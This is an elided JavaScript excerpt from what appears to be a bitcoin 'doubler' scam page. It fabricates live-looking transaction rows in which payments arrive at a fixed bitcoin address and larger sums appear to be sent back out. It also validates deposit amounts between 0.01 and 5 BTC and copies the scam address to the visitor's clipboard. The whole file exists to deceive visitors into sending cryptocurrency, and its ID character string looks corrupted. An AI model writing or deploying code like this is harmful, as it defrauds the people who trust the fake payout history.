...
function generateId(length) {
  for (
    var result = "",
      characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01J1UbxjmFoPDSSQS8wsCqNW3ZF47shFVMu56789",
...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">17asUxdYXzEBfucSfM69nDeSAm5bif3ffx</span> </td> <td>' +
    amount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">1Pv5sznAz8Hsz5nSxpwhX47cTvZx9nKDAR</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    "</a> </td> <td>" +
    send_amount +
    ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
function new_transaction() {
  ...
  (row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">1Pv5sznAz8Hsz5nSxpwhX47cTvZx9nKDAR</span> </td> <td>' +
    amount +
    ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
    tx(999) +
    "</span></td> </tr>"),
    ...
    setTimeout(() => {
      ...
      (row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">1Pv5sznAz8Hsz5nSxpwhX47cTvZx9nKDAR</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        "</a> </td> <td>" +
        send_amount +
        ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
(get_random = function(
  ...
  $("#gen-btn").click(() => {
    if ($("#cal-in").val() >= 0.01 && $("#cal-in").val() <= 5) {
    ...
    } else $("#warn").text("Amount should be within 0.01 BTC to 5 BTC");
  }),
  $("#close").click(() => {
...
$("#copy_address").click(() => {
  $("#copy_address").attr("data-clipboard-text", "1Pv5sznAz8Hsz5nSxpwhX47cTvZx9nKDAR");
